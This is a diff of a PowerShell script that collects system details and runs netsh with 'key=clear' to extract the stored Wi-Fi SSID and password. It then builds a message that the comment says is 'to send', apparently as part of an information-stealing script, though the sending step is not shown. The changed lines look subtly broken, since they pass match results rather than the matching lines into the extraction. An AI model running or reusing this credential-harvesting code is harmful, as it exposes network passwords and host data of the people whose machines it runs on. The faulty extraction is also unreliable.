@@ -24,10 +24,14 @@ $diskSize = [math]::round((Get-CimInstance Win32_LogicalDisk | Where-Object { $_
 # Get network profile name (SSID)
 $networkProfile = (Get-NetConnectionProfile).Name
 
-# Get Wi-Fi SSID and key (password) from the network profile
+# Run netsh command and capture the output for the Wi-Fi SSID and key
 $wifiInfo = netsh wlan show profile name=$networkProfile key=clear
-$ssid = ($wifiInfo | Select-String 'SSID name' | ForEach-Object { ($_ -split ': ')[1].Trim() })[0]
-$wifiKey = ($wifiInfo | Select-String 'Key Content' | ForEach-Object { ($_ -split ': ')[1].Trim() })[0]
+
+# Extract the SSID
+$ssid = ($wifiInfo | ForEach-Object { $_ -match 'SSID name' } | ForEach-Object { $_ -replace '^.*?:', '' }).Trim()
+
+# Extract the Wi-Fi Key (password)
+$wifiKey = ($wifiInfo | ForEach-Object { $_ -match 'Key Content' } | ForEach-Object { $_ -replace '^.*?:', '' }).Trim()
 
 # Create the message to send
 $message = "Host: $hostname`nIP: $ipAddress`nOS: $osVersion`nCPU: $cpu`nMemory: $memory GB`nBIOS: $bios`nDisk Size: $diskSize GB`nWi-Fi SSID: $ssid`nWi-Fi Key: $wifiKey"
